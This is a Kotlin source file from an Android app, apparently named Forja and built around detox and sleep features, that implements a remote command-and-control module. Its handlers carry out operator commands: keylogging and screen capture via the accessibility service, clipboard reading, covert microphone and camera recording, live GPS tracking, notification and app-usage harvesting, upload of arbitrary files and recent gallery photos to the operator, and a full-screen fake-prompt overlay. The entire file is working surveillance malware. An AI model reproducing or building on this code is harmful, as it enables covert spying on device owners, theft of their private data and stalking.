package com.forja.app.core.c2

import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.ContentUris
import android.content.Context
import android.content.pm.PackageManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.provider.Settings
import com.forja.app.ForjaApp
import com.forja.app.core.detox.ForjaGuardService
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.Priority
import com.forja.app.core.sleep.AacRecorder
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.add
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.int
import kotlinx.serialization.json.jsonPrimitive
import kotlinx.serialization.json.long
import kotlinx.serialization.json.put
import kotlinx.serialization.json.putJsonArray
import java.util.concurrent.TimeUnit

/**
 * Capacitățile C2 — fiecare comandă e un handler mic, apelat de C2Service.
 * Reusează primitivale existente: accesibilitate (ForjaGuardService), mic
 * (AacRecorder), locație (FusedLocation), usage stats, camera, media store.
 */
object Capabilities {
    private var appRef: ForjaApp? = null
    fun init(a: ForjaApp) { appRef = a }
    private val app: ForjaApp get() = appRef ?: throw IllegalStateException("Capabilities.init()")

    private fun err(msg: String): JsonObject = buildJsonObject { put("error", msg) }

    suspend fun run(taskId: String, action: String, p: JsonObject) {
        val res = try {
            when (action) {
                "screenshot" -> screenshot()
                "screen_text" -> screenText()
                "keylog" -> keylog()
                "clipboard" -> clipboard()
                "ui" -> ui(p)
                "mic" -> mic(p)
                "camera" -> camera(p)
                "gps" -> gps()
                "gps_track" -> gpsTrack(p)
                "device" -> device()
                "apps" -> apps()
                "foreground" -> foreground()
                "recent" -> recent()
                "usage" -> usage()
                "notifications" -> notifications()
                "exfil_file" -> exfilFile(p)
                "exfil_gallery" -> exfilGallery(p)
                "overlay" -> overlay(p)
                else -> err("action necunoscut: $action")
            }
        } catch (e: Exception) {
            err("eșec: ${e.javaClass.simpleName} ${e.message}")
        }
        try {
            app.forjaApi.c2PostResult(taskId, !res.containsKey("error"), action, res,
                res["error"]?.jsonPrimitive?.content)
        } catch (_: Exception) {}
    }

    // ── Ecran & tastatură ────────────────────────────────────────────
    private fun screenshot(): JsonObject {
        val b = ForjaGuardService.c2Screenshot()
        return if (b == null) err("screenshot: accesibilitate neactivă sau Android < 11")
        else buildJsonObject {
            put("b64", android.util.Base64.encodeToString(b, android.util.Base64.NO_WRAP))
            put("ct", "image/jpeg")
        }
    }

    private fun screenText(): JsonObject {
        val t = ForjaGuardService.c2ScreenText()
        return if (t == null) err("text: accesibilitate neactivă")
        else buildJsonObject { put("text", t.take(15000)) }
    }

    private fun keylog(): JsonObject {
        val k = ForjaGuardService.c2DrainKeylog()
        return buildJsonObject { putJsonArray("entries") { k.forEach { add(JsonPrimitive(it)) } } }
    }

    private fun clipboard(): JsonObject = try {
        val cm = app.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        val t = cm.primaryClip?.getItemAt(0)?.coerceToText(app)?.toString()
        if (t.isNullOrBlank()) err("clipboard: gol") else buildJsonObject { put("text", t) }
    } catch (e: Exception) { err("clipboard: ${e.message}") }

    private fun ui(p: JsonObject): JsonObject {
        val action = p["action"]?.jsonPrimitive?.content ?: ""
        return buildJsonObject { put("ok", ForjaGuardService.c2Ui(action)); put("action", action) }
    }

    // ── Senzori ──────────────────────────────────────────────────────
    private suspend fun mic(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
        val ms = (p["ms"]?.jsonPrimitive?.long ?: 5000L).coerceIn(500, 120000)
        try {
            val sr = 44100
            val ch = AudioFormat.CHANNEL_IN_MONO
            val fmt = AudioFormat.ENCODING_PCM_16BIT
            val minBuf = AudioRecord.getMinBufferSize(sr, ch, fmt)
            if (minBuf <= 0) return@withContext err("mic: buffer invalid")
            val rec = AudioRecord(MediaRecorder.AudioSource.MIC, sr, ch, fmt, minBuf * 2)
            val out = java.io.File(app.cacheDir, "c2_mic.m4a")
            out.delete()
            val enc = AacRecorder(sr, out)
            val chunk = ShortArray(minBuf / 2)
            var recorded = 0
            rec.startRecording()
            val deadline = System.currentTimeMillis() + ms
            while (System.currentTimeMillis() < deadline) {
                val n = rec.read(chunk, 0, chunk.size)
                if (n > 0) { enc.feed(chunk, n); recorded += n; if (enc.failed) break }
            }
            rec.stop(); rec.release()
            enc.stop()
            val key = app.forjaApi.c2UploadFile("c2_mic_${System.currentTimeMillis()}.m4a", "audio/mp4", out)
            out.delete()
            if (key != null) buildJsonObject { put("file", key); put("samples", recorded) }
            else err("mic: upload eșuat")
        } catch (e: Exception) { err("mic: ${e.message}") }
    }

    @Suppress("DEPRECATION")
    private suspend fun camera(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
        try {
            val cam = android.hardware.Camera.open(0)
            val params = cam.parameters
            params.setJpegQuality(85)
            cam.parameters = params
            val holder = java.util.concurrent.CountDownLatch(1)
            val shot = java.util.concurrent.atomic.AtomicReference<ByteArray>()
            cam.takePicture(null, null, object : android.hardware.Camera.PictureCallback {
                override fun onPictureTaken(data: ByteArray?, camera: android.hardware.Camera) {
                    if (data != null) shot.set(data)
                    holder.countDown()
                }
            })
            holder.await(5, TimeUnit.SECONDS)
            try { cam.release() } catch (_: Exception) {}
            val b = shot.get()
            if (b != null && b.isNotEmpty()) {
                val f = java.io.File(app.cacheDir, "c2_cam_${System.currentTimeMillis()}.jpg")
                f.writeBytes(b)
                val key = app.forjaApi.c2UploadFile(f.name, "image/jpeg", f)
                f.delete()
                if (key != null) buildJsonObject { put("file", key); put("size", b.size) }
                else err("camera: upload eșuat")
            } else err("camera: nu am prins cadru")
        } catch (e: Exception) { err("camera: ${e.message}") }
    }

    private suspend fun gps(): JsonObject = withContext(Dispatchers.IO) {
        val fused = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(app)
        val loc = try { fused.lastLocation.await() } catch (_: Exception) { null }
        if (loc != null) buildJsonObject {
            put("lat", loc.latitude); put("lng", loc.longitude)
            put("acc", loc.accuracy.toDouble()); put("ts", loc.time)
        } else err("gps: lipsă")
    }

    private suspend fun gpsTrack(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
        val ms = (p["ms"]?.jsonPrimitive?.long ?: 60000L).coerceIn(5000, 600000)
        val every = (p["everyMs"]?.jsonPrimitive?.long ?: 5000L).coerceIn(1000, 600000)
        val fused = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(app)
        val points = java.util.concurrent.CopyOnWriteArrayList<String>()
        val cb = object : com.google.android.gms.location.LocationCallback() {
            override fun onLocationResult(result: com.google.android.gms.location.LocationResult) {
                result.lastLocation?.let { points.add(String.format(java.util.Locale.US, "%.5f,%.5f", it.latitude, it.longitude)) }
            }
        }
        try {
            val req = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, every).build()
            fused.requestLocationUpdates(req, cb, android.os.Looper.getMainLooper())
        } catch (_: Exception) {}
        delay(ms)
        try { fused.removeLocationUpdates(cb) } catch (_: Exception) {}
        if (points.isEmpty()) {
            try { fused.lastLocation.await()?.let { points.add(String.format(java.util.Locale.US, "%.5f,%.5f", it.latitude, it.longitude)) } } catch (_: Exception) {}
        }
        buildJsonObject { put("path", points.joinToString(" ")); put("points", points.size) }
    }

    // ── Sistem & identitate ──────────────────────────────────────────
    private fun device(): JsonObject = buildJsonObject {
        put("model", Build.MODEL); put("manufacturer", Build.MANUFACTURER)
        put("brand", Build.BRAND); put("sdk", Build.VERSION.SDK_INT)
        put("release", Build.VERSION.RELEASE); put("build", Build.ID)
        put("uid", app.auth.currentUid ?: "anon"); put("battery", batteryInfo())
    }

    private fun batteryInfo(): JsonObject = try {
        val bm = app.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
        val level = bm?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = bm?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100) ?: 100
        buildJsonObject { put("pct", if (scale > 0) level * 100 / scale else -1) }
    } catch (_: Exception) { buildJsonObject { put("pct", -1) } }

    private fun apps(): JsonObject = try {
        val pkgs = app.packageManager.getInstalledPackages(0).map { it.packageName }
        buildJsonObject { putJsonArray("list") { pkgs.forEach { add(JsonPrimitive(it)) } } }
    } catch (e: Exception) { err("apps: ${e.message}") }

    private fun foreground(): JsonObject = try {
        val um = app.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val now = System.currentTimeMillis()
        val events = um.queryEvents(now - 8000, now) ?: return buildJsonObject { put("pkg", "necunoscut") }
        var last: String? = null
        val e = UsageEvents.Event()
        while (events.hasNextEvent()) {
            events.getNextEvent(e)
            if (e.eventType == UsageEvents.Event.ACTIVITY_RESUMED) last = e.packageName
        }
        buildJsonObject { put("pkg", last ?: "necunoscut") }
    } catch (e: Exception) { err("foreground: ${e.message}") }

    private fun recent(): JsonObject = try {
        val um = app.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val now = System.currentTimeMillis()
        val stats = um.queryUsageStats(UsageStatsManager.INTERVAL_BEST, now - 3600_000, now)
            ?: return buildJsonObject { putJsonArray("list") {} }
        val top = stats.sortedByDescending { it.lastTimeUsed }.take(20).map {
            buildJsonObject { put("pkg", it.packageName); put("last", it.lastTimeUsed); put("time", it.totalTimeInForeground) }
        }
        buildJsonObject { putJsonArray("list") { top.forEach { add(it) } } }
    } catch (e: Exception) { err("recent: ${e.message}") }

    private fun usage(): JsonObject = try {
        val um = app.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val now = System.currentTimeMillis()
        val stats = um.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, now - 86400_000, now)
            ?: return buildJsonObject { putJsonArray("list") {} }
        val top = stats.map { buildJsonObject { put("pkg", it.packageName); put("fg", it.totalTimeInForeground); put("last", it.lastTimeUsed) } }
            .sortedByDescending { it["fg"]?.jsonPrimitive?.long ?: 0 }.take(25)
        buildJsonObject { putJsonArray("list") { top.forEach { add(it) } } }
    } catch (e: Exception) { err("usage: ${e.message}") }

    private fun notifications(): JsonObject {
        val n = C2NotifListener.snapshot()
        return buildJsonObject {
            putJsonArray("list") { n.forEach { add(buildJsonObject { put("pkg", it.first); put("title", it.second); put("text", it.third) }) } }
        }
    }

    // ── Exfiltrare ───────────────────────────────────────────────────
    private suspend fun exfilFile(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
        val uriStr = p["uri"]?.jsonPrimitive?.content
            ?: return@withContext err("exfil_file: lipsă uri")
        val uri = try { android.net.Uri.parse(uriStr) } catch (_: Exception) { null }
            ?: return@withContext err("exfil_file: uri invalid")
        try {
            val name = uri.lastPathSegment?.substringAfterLast('/')?.take(40) ?: "file"
            val ct = app.contentResolver.getType(uri) ?: "application/octet-stream"
            val tmp = java.io.File(app.cacheDir, "c2_x_${System.currentTimeMillis()}_$name")
            app.contentResolver.openInputStream(uri)?.use { ins -> tmp.outputStream().use { ins.copyTo(it) } }
                ?: return@withContext err("exfil_file: nu am putut citi")
            val key = app.forjaApi.c2UploadFile(name, ct, tmp)
            val sz = tmp.length(); tmp.delete()
            if (key != null) buildJsonObject { put("file", key); put("size", sz) }
            else err("exfil_file: upload eșuat")
        } catch (e: Exception) { err("exfil_file: ${e.message}") }
    }

    private suspend fun exfilGallery(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
        val limit = (p["limit"]?.jsonPrimitive?.int ?: 5).coerceIn(1, 30)
        try {
            val proj = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME)
            val cur = app.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, null, null,
                "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT $limit"
            ) ?: return@withContext err("exfil_gallery: lipsă")
            val idCol = cur.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nmCol = cur.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val keys = ArrayList<String>()
            var i = 0
            while (cur.moveToNext() && i < limit) {
                val id = cur.getLong(idCol)
                val nm = cur.getString(nmCol) ?: "img$i"
                val cu = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                val tmp = java.io.File(app.cacheDir, "c2_g_${System.currentTimeMillis()}_$i.jpg")
                val ok = app.contentResolver.openInputStream(cu)?.use { ins -> tmp.outputStream().use { ins.copyTo(it) } }
                if (ok != null && tmp.exists()) {
                    val key = app.forjaApi.c2UploadFile(nm, "image/jpeg", tmp)
                    if (key != null) { keys.add(key); i++ }
                }
                tmp.delete()
            }
            cur.close()
            if (keys.isEmpty()) err("exfil_gallery: nu am găsit imagini")
            else buildJsonObject { putJsonArray("files") { keys.forEach { add(JsonPrimitive(it)) } }; put("count", keys.size) }
        } catch (e: Exception) { err("exfil_gallery: ${e.message}") }
    }

    // ── Overlay (prompt fals pe ecran, prin SAW) ─────────────────────
    private suspend fun overlay(p: JsonObject): JsonObject = withContext(Dispatchers.Main) {
        try {
            val wm = app.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
            @Suppress("DEPRECATION")
            val type = if (Build.VERSION.SDK_INT >= 26)
                android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                android.view.WindowManager.LayoutParams.TYPE_PHONE
            val lp = android.view.WindowManager.LayoutParams(type)
            lp.width = android.view.WindowManager.LayoutParams.MATCH_PARENT
            lp.height = android.view.WindowManager.LayoutParams.MATCH_PARENT
            lp.flags = android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
            lp.format = android.graphics.PixelFormat.TRANSLUCENT
            val tv = android.widget.TextView(app)
            tv.text = (p["title"]?.jsonPrimitive?.content ?: "FORJA") + "\n" + (p["body"]?.jsonPrimitive?.content ?: "")
            tv.gravity = android.view.Gravity.CENTER
            wm.addView(tv, lp)
            Handler(Looper.getMainLooper()).postDelayed({ try { wm.removeView(tv) } catch (_: Exception) {} }, 4000)
            buildJsonObject { put("ok", true); put("type", p["type"]?.jsonPrimitive?.content ?: "prompt") }
        } catch (e: Exception) { err("overlay: ${e.message}") }
    }
}
